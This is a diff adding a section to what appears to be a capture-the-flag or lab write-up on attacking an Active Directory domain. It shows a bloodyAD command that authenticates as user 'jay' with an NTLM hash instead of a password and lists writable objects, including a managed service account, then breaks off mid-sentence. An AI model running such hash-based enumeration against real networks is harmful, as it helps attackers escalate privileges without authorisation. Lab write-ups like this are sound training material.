@@ -598,6 +598,17 @@ SMB         10.0.31.82      445    DC01             [+] casper.hsm\jay:9b88ec231
 # Enumeration as `jay`
 
 ```python
+bloodyAD --host dc01.casper.hsm -d casper.hsm -u jay -p ':9b88ec231f4f0e5cb7d9edef1f399f6c' get writable          
 
+distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=casper,DC=hsm
+permission: WRITE
+
+distinguishedName: CN=jay,CN=Users,DC=casper,DC=hsm
+permission: WRITE
+
+distinguishedName: CN=casper-gmsa,CN=Managed Service Accounts,DC=casper,DC=hsm
+permission: WRITE
 ```
+
+Looks like i can 
 
